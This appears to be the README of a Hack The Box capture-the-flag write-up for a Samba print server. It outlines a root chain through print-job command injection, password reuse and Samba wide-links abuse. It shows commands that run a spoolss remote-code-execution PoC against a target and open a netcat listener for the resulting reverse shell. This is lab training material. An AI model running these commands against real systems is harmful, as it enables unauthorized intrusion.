# Abducted (HTB, Medium, Linux)

Samba file/print server. Guest printer → print-job injection → user via reused rclone password → `force user` + wide links → polkit-delegated `smbd` drop-in → root.

- **[WRITEUP.md](WRITEUP.md)** — łańcuch (bez flag)
- **[scripts/](scripts/)** — PoC `spoolss` + helper na wide links

## Scripts

| File | What |
|------|------|
| `scripts/cve_2026_4480_spoolss.py` | unauth RCE via `StartDocPrinter` job name `%J` |
| `scripts/marcus_wide_links.sh` | `scott` → symlink + smbclient put key as `marcus` |

```bash
python3 scripts/cve_2026_4480_spoolss.py --rhost <IP> --lhost <tun0> --lport 4444
nc -lvnp 4444
```

No flags, VPN configs, or live passwords in this tree.
